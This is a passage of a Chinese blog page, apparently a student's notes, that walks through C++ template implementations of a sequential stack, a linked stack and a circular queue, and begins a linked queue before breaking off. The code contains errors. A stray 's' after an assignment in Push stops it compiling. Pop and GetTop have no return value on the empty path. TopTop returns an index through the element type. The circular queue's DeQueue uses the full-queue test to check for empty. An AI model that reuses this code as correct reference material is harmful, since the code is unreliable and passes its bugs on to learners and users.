<li><strong>链式队列</strong>：<ul>
<li>入队：新元素被添加到链表的尾部，并更新尾指针。</li>
<li>出队：头部的元素被移除，并更新头指针。</li>
</ul>
</li>
</ol>
<h1 id="代码主体"><a href="#代码主体" class="headerlink" title="代码主体"></a>代码主体</h1><h2 id="顺序栈SeqStack的实现："><a href="#顺序栈SeqStack的实现：" class="headerlink" title="顺序栈SeqStack的实现："></a>顺序栈SeqStack的实现：</h2><blockquote>
<p>自己写的</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> StackSize = <span class="number">100</span>;  <span class="comment">// 定义最大栈顶具体情况具体分析</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;   <span class="comment">//定义模板类SeqStack</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqStack</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">SeqStack</span>();   <span class="comment">//构造函数，初始化空栈</span></span><br><span class="line">	~<span class="built_in">SeqStack</span>();	<span class="comment">//析构函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(DataType x)</span></span>;	<span class="comment">//压栈</span></span><br><span class="line">	<span class="function">DataType <span class="title">Pop</span><span class="params">()</span></span>;	<span class="comment">//出栈</span></span><br><span class="line">	<span class="function">DataType <span class="title">GetTop</span><span class="params">()</span></span>;<span class="comment">//取栈顶</span></span><br><span class="line">	<span class="function">DataType <span class="title">TopTop</span><span class="params">()</span></span>;<span class="comment">//取栈顶下标</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">empty</span><span class="params">()</span></span>;	<span class="comment">//判空操作</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	DataType data[StackSize];	<span class="comment">//存放栈元素的数组</span></span><br><span class="line">	<span class="type">int</span> top;	<span class="comment">//栈顶元素的下标</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">SeqStack&lt;DataType&gt;::~<span class="built_in">SeqStack</span>()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> SeqStack&lt;DataType&gt;::<span class="built_in">Push</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == StackSize <span class="number">-1</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈满&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		top++;</span><br><span class="line">		data[top] = x;s</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType SeqStack&lt;DataType&gt;::<span class="built_in">Pop</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == <span class="number">-1</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		DataType x;</span><br><span class="line">		x = data[top];</span><br><span class="line">		top--;</span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType SeqStack&lt;DataType&gt;::<span class="built_in">GetTop</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == <span class="number">-1</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> data[top];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> SeqStack&lt;DataType&gt;::<span class="built_in">empty</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (top == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType SeqStack&lt;DataType&gt;::<span class="built_in">TopTop</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span>	top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">SeqStack&lt;DataType&gt;::<span class="built_in">SeqStack</span>()</span><br><span class="line">&#123;</span><br><span class="line">	top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ws1 = <span class="number">0</span>;</span><br><span class="line">	SeqStack&lt;<span class="type">int</span>&gt; S&#123;&#125;;<span class="comment">//定义顺序栈变量</span></span><br><span class="line">	S.<span class="built_in">Push</span>(<span class="number">1</span>);</span><br><span class="line">	S.<span class="built_in">Push</span>(<span class="number">2</span>);</span><br><span class="line">	S.<span class="built_in">Push</span>(<span class="number">3</span>); </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;系统已压栈1,2,3&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;输入一个元素进行压栈&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; ws1;</span><br><span class="line">	S.<span class="built_in">Push</span>(ws1);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;当前栈顶元素为：&quot;</span> &lt;&lt; S.<span class="built_in">GetTop</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;执行一次出栈操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已释放&quot;</span> &lt;&lt; S.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;当前栈顶元素为：&quot;</span> &lt;&lt; S.<span class="built_in">GetTop</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;执行一次判空操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (S.<span class="built_in">empty</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;正在出所有栈&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = S.<span class="built_in">TopTop</span>(); i &gt; <span class="number">-1</span> ; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;已释放&quot;</span> &lt;&lt; S.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已释放出所有栈&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;执行一次判空操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (S.<span class="built_in">empty</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="链式栈LinkStack的实现："><a href="#链式栈LinkStack的实现：" class="headerlink" title="链式栈LinkStack的实现："></a>链式栈LinkStack的实现：</h2><blockquote>
<p>自己写的</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    DataType data;</span><br><span class="line">    Node&lt;DataType&gt;* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkStack</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkStack</span>();</span><br><span class="line">    ~<span class="built_in">LinkStack</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(DataType x)</span></span>;  <span class="comment">//入栈</span></span><br><span class="line">    <span class="function">DataType <span class="title">Pop</span><span class="params">()</span></span>;     <span class="comment">//出栈</span></span><br><span class="line">    <span class="function">DataType <span class="title">GetTop</span><span class="params">()</span></span>;  <span class="comment">//取栈顶</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Empty</span><span class="params">()</span></span>;        <span class="comment">//判空</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;DataType&gt;* top;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkStack&lt;DataType&gt;::<span class="built_in">LinkStack</span>()</span><br><span class="line">&#123;</span><br><span class="line">    top = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkStack&lt;DataType&gt;::~<span class="built_in">LinkStack</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;程序退出，析构函数被调用!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">Empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;出栈元素：&quot;</span> &lt;&lt; <span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;程序退出链栈已清空!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkStack&lt;DataType&gt; ::<span class="built_in">GetTop</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == <span class="literal">nullptr</span>)</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;下溢异常&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> top-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkStack&lt;DataType&gt; ::<span class="built_in">Push</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* s = <span class="literal">nullptr</span>;</span><br><span class="line">    s = <span class="keyword">new</span> Node&lt;DataType&gt;;</span><br><span class="line">    s-&gt;data = x; <span class="comment">//申请结点s数据域为x</span></span><br><span class="line">    s-&gt;next = top;</span><br><span class="line">    top = s; <span class="comment">//将结点s插在栈顶</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkStack&lt;DataType&gt; ::<span class="built_in">Pop</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = <span class="literal">nullptr</span>;</span><br><span class="line">    DataType x;</span><br><span class="line">    <span class="keyword">if</span> (top == <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        x = top-&gt;data; p = top; <span class="comment">//暂存栈顶元素</span></span><br><span class="line">        top = top-&gt;next; <span class="comment">//将栈顶结点摘链</span></span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> LinkStack&lt;DataType&gt;::<span class="built_in">Empty</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ws1 = <span class="number">0</span>;</span><br><span class="line">    LinkStack&lt;<span class="type">int</span>&gt; S&#123;&#125;;<span class="comment">//定义顺序栈变量S</span></span><br><span class="line">    S.<span class="built_in">Push</span>(<span class="number">1</span>);</span><br><span class="line">    S.<span class="built_in">Push</span>(<span class="number">2</span>);</span><br><span class="line">    S.<span class="built_in">Push</span>(<span class="number">3</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;系统已压栈1,2,3&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;输入一个元素进行压栈&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; ws1;</span><br><span class="line">    S.<span class="built_in">Push</span>(ws1);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;当前栈顶元素为：&quot;</span> &lt;&lt; S.<span class="built_in">GetTop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;执行一次出栈操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已释放&quot;</span> &lt;&lt; S.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;当前栈顶元素为：&quot;</span> &lt;&lt; S.<span class="built_in">GetTop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;执行一次判空操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (S.<span class="built_in">Empty</span>() == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;栈非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;正在出所有栈&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">while</span> (S.<span class="built_in">Empty</span>() != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;已释放&quot;</span> &lt;&lt; S.<span class="built_in">Pop</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已释放出所有栈&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*****************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;执行一次判空操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (S.<span class="built_in">Empty</span>() == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;栈空&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;栈非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="循环队列CirQueue的实现："><a href="#循环队列CirQueue的实现：" class="headerlink" title="循环队列CirQueue的实现："></a>循环队列CirQueue的实现：</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> QueueSize = <span class="number">100</span>; <span class="comment">//最大长度</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CirQueue</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">CirQueue</span>();</span><br><span class="line">	~<span class="built_in">CirQueue</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(DataType x)</span></span>;<span class="comment">//入队</span></span><br><span class="line">	<span class="function">DataType <span class="title">DeQueue</span><span class="params">()</span></span>;<span class="comment">//出队</span></span><br><span class="line">	<span class="function">DataType <span class="title">GetQueue</span><span class="params">()</span></span>;<span class="comment">//取队头</span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">Empty</span><span class="params">()</span></span>;<span class="comment">//判空操作</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	DataType data[QueueSize];<span class="comment">//存放需要的数组</span></span><br><span class="line">	<span class="type">int</span> front, rear;<span class="comment">//队头和队尾指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">CirQueue&lt;DataType&gt;::<span class="built_in">CirQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	rear = front = QueueSize - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">CirQueue&lt;DataType&gt;::~<span class="built_in">CirQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> CirQueue&lt;DataType&gt;::<span class="built_in">EnQueue</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((rear<span class="number">+1</span>)%QueueSize==front)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队满&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		rear = (rear + <span class="number">1</span>) % QueueSize; <span class="comment">//队尾指针+1</span></span><br><span class="line">		data[rear] = x;			<span class="comment">//在队尾插入元素</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType CirQueue&lt;DataType&gt;::<span class="built_in">DeQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((rear + <span class="number">1</span>)%QueueSize==front )</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		front = (front + <span class="number">1</span>) % QueueSize;</span><br><span class="line">		<span class="keyword">return</span> data[front];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType CirQueue&lt;DataType&gt;::<span class="built_in">GetQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (front == rear)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> data[(front + <span class="number">1</span>) % QueueSize];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> CirQueue&lt;DataType&gt;::<span class="built_in">Empty</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (front == rear)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CirQueue&lt;<span class="type">int</span>&gt; S&#123;&#125;;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	S.<span class="built_in">EnQueue</span>(<span class="number">1</span>);</span><br><span class="line">	S.<span class="built_in">EnQueue</span>(<span class="number">2</span>);</span><br><span class="line">	S.<span class="built_in">EnQueue</span>(<span class="number">3</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已入队1,2,3&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;******取一次队头******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;队头是：&quot;</span> &lt;&lt; S.<span class="built_in">GetQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入一个元素进行入队&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; x;</span><br><span class="line">	S.<span class="built_in">EnQueue</span>(x);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已入队：&quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;******取一次队头******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;队头是：&quot;</span> &lt;&lt; S.<span class="built_in">GetQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;******执行一次出队******&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****进行一次判空*****&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (S.<span class="built_in">Empty</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123; </span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;已出队：&quot;</span> &lt;&lt; S.<span class="built_in">DeQueue</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*****进行一次判空*****&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (S.<span class="built_in">Empty</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队列非空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="链式队列LinkQueue的实现："><a href="#链式队列LinkQueue的实现：" class="headerlink" title="链式队列LinkQueue的实现："></a>链式队列LinkQueue的实现：</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	DataType data;</span><br><span class="line">	node&lt;DataType&gt;* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkQueue</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">LinkQueue</span>();</span><br><span class="line">	~<span class="built_in">LinkQueue</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">enQueue</span><span class="params">(DataType x)</span></span>;</span><br><span class="line">	<span class="function">DataType <span class="title">DeQueue</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">DataType <span class="title">GetQueue</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">Empty</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	node&lt;DataType&gt;* front, * rear;</span><br><span class="line">&#125;;</span><br><span 